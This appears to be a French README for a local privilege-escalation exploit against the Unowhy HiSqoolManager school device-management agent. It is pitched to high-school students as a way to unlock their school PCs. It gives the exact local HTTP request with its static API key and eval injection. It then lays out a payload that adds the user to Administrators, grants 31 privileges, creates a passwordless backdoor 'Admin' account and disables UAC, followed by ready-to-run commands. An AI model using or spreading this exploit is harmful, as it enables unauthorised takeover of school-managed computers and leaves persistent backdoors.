# POC — RCE -> LPE to SYSTEM -> Local Posture Takeover
**(DEBLOQUE NIMPORTE QUELLE PC DE TOUT LES LYCEE DE L ILE DE FRANCE instantanment 🔥🔥🔥)**

> **Cible** : HiSqoolManager.exe (Unowhy, agent MDM scolaire)
> **Vecteur** : `POST /commands` — `category:js / command:eval / arguments.source`
> **Impact** : Un élève non-privilégié obtient les droits administrateurs locaux,
>              un compte backdoor "Admin" (mdp vide), et l'UAC désactivé.
> **Exécution** : Le code JS est eval'd dans un process Node tournant en **LocalSystem**.

---

## C'est quoi et pour qui ?

Ce POC est un outil pour les **lycéens** qui veulent reprendre le contrôle de leur PC de bureau. Si ton établissement utilise Unowhy, ton PC est probablement locké : tu peux pas installer de logiciel, tu peux pas modifier les paramètres, et ton compte est bridé. Ce POC contourne tout ça en exploitant une faille dans l'agent MDM lui-même.

**Cas d'usage typiques :**
- Tu veux installer un logiciel (Jeux, Logicielle , Epic Gamme...) mais l'installation est bloquée
- Tu veux accéder à des fonctionnalités Windows qui sont désactivées par l'admin
- Tu veux personnaliser ton poste (Fond d ecran, ect...)


**En combinaison avec [Unowhy-Tools](https://github.com/STY1001/Unowhy-Tools)**, tu peux aller encore plus loin : désactiver l'agent, supprimer les restrictions, récupérer un accès complet à ton poste. Ce POC te donne les droits admin, et Unowhy-Tools t'aide à nettoyer après.

---

## Comment la faille marche

HiSqoolManager est un agent MDM (Mobile Device Management) installé sur les postes scolaires. Il tourne en tant que **LocalSystem** (le compte le plus privilégié de Windows) et expose un endpoint HTTP local :

```
POST http://127.0.0.1:7654/commands
Header: x-api-key: would-nepal-sing-below
Body: {"category":"js","command":"eval","arguments":{"source":"<JS_CODE>"}}
```

Le champ `source` est passé directement à `eval()` dans le process Node.js **sans aucune authentification**. Comme le process tourne en SYSTEM, le code JS qu'on injecte s'exécute avec les droits les plus élevés de Windows.

**Le problème fondamental** : le service accepte du code arbitraire via HTTP sans vérifier QUI envoie la requête. N'importe quel process sur la machine (donc un user standard) peut envoyer cette requête et obtenir du code exécuté en SYSTEM.

**La chaîne d'exploitation :**
1. L'élève lance le POC depuis son compte standard
2. Le POC envoie le payload JS via HTTP au service
3. Le service évalue le JS en tant que SYSTEM
4. Le payload ajoute l'élève aux Administrateurs, crée un compte backdoor, désactive l'UAC
5. Après reboot, l'élève a les droits admin + compte "Admin" (mdp vide)

**Pourquoi c'est critique :**
- Le MDM est **installé partout** dans l'établissement (déployé via Intune/Azure AD)
- Le endpoint est accessible **depuis n'importe quel compte** de la machine
- L'exploitation est **silencieuse** (pas de log côté service)
- Les changements sont **durables** (persistent après reboot)

---

## Architecture

```
run_poc.ps1 (lanceur, tourne en user standard)
  |
  |--- capture requester SID (whoami /user)
  |--- injecte process.env.POC_* (SID, logDir, dry-run...)
  |--- wrappe dans IIFE: (function(){ ... })();
  |
  |=== POST http://127.0.0.1:7654/commands ===
  |    x-api-key: would-nepal-sing-below
  |    body: { category:"js", command:"eval", arguments:{ source: <JS> } }
  |
  v
HiSqoolManager.exe (NestJS, LocalSystem)
  |
  |--- evalSource(source) dans process SYSTEM
  |--- payload.js exécute les phases A-F
  |--- logs + artefacts dans C:\Windows\System32\zcode_poc\<runId>\
  |
run_poc.ps1
  |
  |--- copie les artefacts System32 -> runs/<runId>/
  |--- parse summary.json, vérifie chaque phase
  |--- log final + verdict
```

## Fichiers

| Fichier | Rôle |
|---------|------|
| `run_poc.ps1` | Lanceur PowerShell. Capture contexte requester, envoie le payload, récupère artefacts, verdict. |
| `payload/poc_payload.js` | Payload JS exécuté par le service SYSTEM. Multi-phase avec logging fichier. |

## Phases du payload

### Phase A — Identité + résolution cible
- Dump identité SYSTEM (`whoami`, `os.userInfo()`, PID/PPID/execPath) → `identity.json`
- Résolution SID ↔ nom via `NTAccount.Translate()` (locale-independent)
- Preuve LPE : le fichier est écrit dans `System32\zcode_poc\` (SYSTEM-only)

### Phase B — Ajout au groupe Administrateurs
- `Add-LocalGroupMember -Name "Administrateurs" -Member <nom cible>`
- SID well-known `S-1-5-32-544` (invariant FR/EN), gère "already a member"

### Phase C — User Rights Assignment (31 privilèges)
- Export via `secedit /export` → merge avec les droits existants
- Injection du SID cible dans 31 droits (SeTcbPrivilege, SeDebugPrivilege, SeImpersonatePrivilege, SeLoadDriverPrivilege, etc.)
- Application via `secedit /configure /areas USER_RIGHTS`
- Retrait des `SeDeny*` pour la cible

### Phase D — Création compte "Admin" (mdp vide) + ajout Admins
- Désactivation `MinimumPasswordLength=0`, `PasswordComplexity=0` via `secedit`
- `net user "Admin" "" /add` + fallback `New-LocalUser -NoPassword`
- Ajout au groupe Administrateurs

### Phase E — Désactivation UAC
6 clés registre : `EnableLUA=0`, `ConsentPromptBehaviorAdmin=0`, `ConsentPromptBehaviorUser=0`, etc.

### Phase F — Vérification
Dump de l'état réel post-mutation : `whoami /groups`, `whoami /priv`, `net user`, `secedit /export`, `reg query` UAC keys.

## Utilisation

```powershell
# Mode normal (mutations réelles)
.\run_poc.ps1

# Dry-run (lecture seule)
.\run_poc.ps1 -DryRun

# Cible explicite
.\run_poc.ps1 -TargetUser "ENT\TestUser"

# Compte backdoor personnalisé
.\run_poc.ps1 -NewAdminName "Backdoor"
```

## CWE associés

| CWE | Description |
|-----|-------------|
| CWE-94 | Code Injection (eval de source externe) |
| CWE-306 | Missing Authentication (clé statique universelle) |
| CWE-778 | Insufficient Logging (pas de log des eval dans le service) |
| CWE-269 | Improper Privilege Management (service SYSTEM avec eval public) |
| CWE-250 | Execution with Unnecessary Privileges (SYSTEM pour un MDM agent) |
